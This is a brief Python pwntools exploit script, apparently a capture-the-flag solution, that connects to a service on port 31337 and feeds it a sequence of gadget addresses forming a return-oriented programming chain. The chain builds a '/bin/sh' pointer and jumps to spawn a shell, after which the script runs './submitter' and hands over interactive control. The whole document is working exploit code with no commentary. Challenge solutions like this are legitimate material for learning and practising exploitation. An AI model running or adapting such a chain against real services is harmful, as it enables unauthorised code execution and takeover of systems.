#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))
def set(addr):
    p.recvuntil(b'Addr pls:')
    p.sendline(str(addr).encode())

set(1)
set(2)
set(3)
set(400000000)

binsh1 = 390478
binsh2 = 110081

pop_rdi_rbp = 443677
add_rdi_add_rax_rdi = 469504
set(pop_rdi_rbp)
set(binsh1 - 21)
set(1)
set(add_rdi_add_rax_rdi)
set(pop_rdi_rbp)
set(binsh2 - 21)
set(1)
set(add_rdi_add_rax_rdi)
set(401914)
set(0)
sleep(1)
p.sendline(b'./submitter')
p.interactive()
p.close()
